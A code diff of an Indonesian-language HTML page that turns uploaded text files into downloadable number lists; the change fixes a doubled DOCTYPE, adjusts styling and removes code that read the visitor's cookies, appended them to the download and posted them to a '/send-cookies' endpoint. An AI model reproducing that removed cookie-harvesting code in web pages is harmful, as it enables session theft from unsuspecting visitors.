@@ -1,4 +1,4 @@
-<!<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -7,18 +7,18 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 30px;
+            margin: 40px;
         }
         .container {
-            margin-bottom: 30px; /* Jarak antar kontainer */
+            margin-bottom: 30px; 
         }
         button {
-            margin-top: 10px; /* Jarak antara input file dan tombol */
+            margin-top: 10px; 
         }
         .label {
             display: block;
             font-weight: bold;
-            margin-bottom: 5px; /* Jarak antara label dan input file */
+            margin-bottom: 5px; 
         }
     </style>
 </head>
@@ -38,6 +38,7 @@
         <input type="file" id="fileInput3">
         <button onclick="processFile('fileInput3', 'Admin.txt')">Unduh File</button>
     </div>
+
     <script>
         function processFile(inputId, fileName) {
             const fileInput = document.getElementById(inputId);
@@ -65,13 +66,7 @@
                     });
                 });
 
-                // Ambil cookies
-                const cookies = document.cookie;
-
-                // Gabungkan hasil file dan cookies
-                const finalContent = combinedNumbers.trim() + '\n\nCookies:\n' + cookies;
-
-                const blob = new Blob([finalContent], { type: 'text/plain' });
+                const blob = new Blob([combinedNumbers.trim()], { type: 'text/plain' });
                 const url = URL.createObjectURL(blob);
 
                 const a = document.createElement('a');
@@ -85,27 +80,6 @@
             };
 
             reader.readAsText(file);
-        }
-
-        function processCookies() {
-            const cookies = document.cookie;
-
-            // Kirim cookies ke server untuk email
-            fetch('/send-cookies', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ cookies: cookies }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Cookies telah dikirim!');
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                alert('Terjadi kesalahan saat mengirim cookies.');
-            });
         }
     </script>
 </body>
